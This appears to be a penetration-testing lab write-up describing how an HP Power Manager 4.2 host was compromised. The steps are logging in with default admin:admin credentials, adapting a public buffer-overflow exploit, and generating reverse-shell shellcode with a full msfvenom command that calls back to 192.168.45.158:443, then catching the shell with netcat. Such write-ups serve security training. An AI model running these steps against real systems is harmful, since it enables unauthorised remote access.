
### OpenPorts

- 80
	- HP Power Manager (logged in using default creds **admin:admin**)
- 445
	- Nothing in here
- 3389
	- nothing in here, need creds to enter RDP.
### Path To Compromise

- Found HP Power Manager login port available on port 80
	- Default credentials allowed me to log in as admin:admin
	- Found the version **HP Power Manager 4.2 (Build 7)**
- Looking in searchsploit, we found that there's is a buffer overflow vulnerability in the login form on this application. 
- ![[Pasted image 20240115202021.png]]
- Checking the exploit for universal Buffer Overflow, we can see that the description matches the same type of traffic we observed on our target using burp suite. However, a few modifications are needed in order for the exploit to work.
1. Create our own reverse shell code using msfvenom and exclude the bad characters provided in the documentation. To generate our shell code I used `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.158 LPORT=443 -a x86 -f c -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a"`
2. Step 2 is to add our new shell code in the script, ![[Pasted image 20240115202246.png]]![[Pasted image 20240115202450.png]]
4. Finally, we set up our nc listener on port 443 and executed the exploit to catch our reverse shell.
![[Pasted image 20240115202607.png]]
